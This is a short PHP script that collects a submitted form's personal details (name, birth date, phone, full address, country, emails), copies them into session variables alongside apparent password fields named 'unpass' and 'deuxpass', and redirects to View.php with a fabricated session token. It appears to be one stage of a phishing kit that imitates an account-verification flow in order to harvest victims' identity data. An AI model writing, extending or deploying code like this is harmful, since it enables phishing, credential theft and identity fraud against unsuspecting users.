<?php
session_start();
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$bday = $_POST['bday'];
$bmonth = $_POST['bmonth'];
$byear = $_POST['byear'];
$phone = $_POST['phone'];
$adress = $_POST['address1'];
$adresss = $_POST['address2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$cntry = $_POST['cntry'];
$emails = $_POST['emails'];

$_SESSION['unpass'] = $unpass;
$_SESSION['deuxpass'] = $deuxpass;
$_SESSION['firstname'] = $firstname;
$_SESSION['lastname'] = $lastname;
$_SESSION['bday'] = $bday;
$_SESSION['bmonth'] = $bmonth;
$_SESSION['byear'] = $byear;
$_SESSION['phone'] = $phone;
$_SESSION['address1'] = $adress;
$_SESSION['address2'] = $adresss;
$_SESSION['city'] = $city;
$_SESSION['state'] = $state;
$_SESSION['cntry'] = $cntry;
$_SESSION['zip'] = $zip;
$_SESSION['emails'] = $emails;
header("Location: View.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548");
?>
